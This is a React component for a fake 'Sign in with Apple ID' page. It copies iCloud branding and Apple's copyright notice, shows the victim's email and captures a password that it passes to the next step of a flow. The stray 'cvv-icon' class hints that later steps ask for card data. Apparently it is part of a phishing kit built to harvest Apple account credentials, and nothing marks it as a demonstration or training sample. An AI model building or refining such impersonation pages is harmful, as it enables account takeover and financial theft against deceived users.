import { useState } from 'react'
import Background from '../components/Background'

export default function PasswordPage({ email, onBack, onNext }) {
  const [password, setPassword] = useState('')
  const [showPassword, setShowPassword] = useState(false)
  const [error, setError] = useState('')

  const handleSubmit = () => {
    if (!password.trim()) {
      setError('Password is required.')
      return
    }
    setError('')
    onNext(password)
  }

  const handleKeyDown = (e) => {
    if (e.key === 'Enter') handleSubmit()
  }

  return (
    <>
      <Background />

      <div className="topbar">
        <span className="topbar-logo" style={{ fontWeight: 600 }}>iCloud</span>
        <div className="topbar-right">
          <span className="topbar-link">Setup Instructions</span>
          <span style={{ color: 'rgba(255,255,255,0.4)', margin: '0 4px' }}>|</span>
          <div className="topbar-help">
            <svg viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <circle cx="12" cy="12" r="10"/>
              <path d="M9.09 9a3 3 0 015.83 1c0 2-3 3-3 3"/>
              <line x1="12" y1="17" x2="12.01" y2="17"/>
            </svg>
          </div>
        </div>
      </div>

      <div className="page">
        <div className="card">
          {/* Modern Apple ID Icon */}
          <div className="icloud-icon">
            <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
               <circle cx="50" cy="50" r="50" fill="#1d1d1f"/>
               <circle cx="50" cy="38" r="14" fill="white"/>
               <path d="M50,56 c-15,0 -24,8 -24,18 v2 c0,2 2,4 4,4 h40 c2,0 4,-2 4,-4 v-2 c0,-10 -9,-18 -24,-18 Z" fill="white"/>
            </svg>
          </div>

          <div className="title">Sign in with Apple ID</div>
          
          <div className="email-display" style={{ marginBottom: 10, background: 'rgba(0,0,0,0.05)', color: '#1d1d1f' }}>
            <strong style={{ fontSize: 13 }}>{email}</strong>
          </div>

          <div className="input-wrap">
            <input
              className="input-field"
              type={showPassword ? 'text' : 'password'}
              placeholder="Password"
              value={password}
              onChange={e => { setPassword(e.target.value); setError('') }}
              onKeyDown={handleKeyDown}
              autoFocus
            />
            <button
              className="cvv-icon"
              onClick={() => setShowPassword(!showPassword)}
              style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 0, position: 'absolute', right: 48, top: '50%', transform: 'translateY(-50%)' }}
            >
              {showPassword ? (
                <svg viewBox="0 0 24 24" fill="none" stroke="#8e8e93" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" style={{ width: 20, height: 20 }}>
                  <path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94"/>
                  <path d="M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19"/>
                  <line x1="1" y1="1" x2="23" y2="23"/>
                </svg>
              ) : (
                <svg viewBox="0 0 24 24" fill="none" stroke="#8e8e93" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" style={{ width: 20, height: 20 }}>
                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                  <circle cx="12" cy="12" r="3"/>
                </svg>
              )}
            </button>
            <button
               className={`input-arrow ${password.length > 0 ? 'active' : ''}`}
               onClick={handleSubmit}
            >
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
                <path d="M5 12h14M12 5l7 7-7 7"/>
              </svg>
            </button>
          </div>

          {error && <div className="error-msg">{error}</div>}

          <button className="primary-btn" onClick={handleSubmit} disabled={!password}>
            Sign In
          </button>

          <button className="back-btn" onClick={onBack} style={{ alignSelf: 'center', marginTop: 10, color: '#0071e3' }}>
            Cancel
          </button>
        </div>
      </div>

      <div className="bottom-links">
        <a href="#">Forgotten your password?</a>
        <span className="sep">|</span>
        <a href="#">Privacy Policy</a>
        <span className="sep">|</span>
        <span className="copyright">Copyright © 2025 Apple Inc. All rights reserved.</span>
      </div>
    </>
  )
}
